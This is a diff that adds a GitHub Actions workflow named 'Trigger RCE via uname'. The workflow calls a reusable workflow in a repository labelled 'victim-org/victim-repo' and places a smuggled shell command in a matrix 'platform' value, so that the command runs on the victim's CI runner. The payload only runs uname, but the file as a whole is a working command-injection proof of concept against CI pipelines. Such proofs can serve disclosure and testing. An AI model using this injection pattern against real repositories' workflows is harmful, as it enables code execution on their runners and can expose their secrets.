@@ -1,0 +1,17 @@
+name: Trigger RCE via uname
+
+on:
+  workflow_dispatch:
+
+jobs:
+  trigger:
+    uses: victim-org/victim-repo/.github/workflows/macos_tests.yml@main
+    with:
+      matrix:
+        xcode_version: ["16.3"]
+        os:
+          - name: "Injected"
+            platform: 'iOS; uname -a > uname_output.txt; cat uname_output.txt #'
+        arch: [arm64]
+        macos_version: [sequoia]
+        macos_arch: [ARM64]
